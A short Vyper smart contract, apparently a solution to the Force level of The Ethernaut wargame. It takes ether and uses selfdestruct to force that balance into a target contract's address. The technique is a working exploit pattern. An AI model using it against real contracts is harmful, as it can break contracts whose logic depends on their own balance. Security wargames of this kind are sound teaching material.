# pragma version 0.4.0
"""
@title A hack for level 7 (Force) of The Ethernaut
@license MIT
@author unluckyduke7
"""

@payable
@external
def hack(instance: address):
	assert msg.value != 0
	selfdestruct(instance)
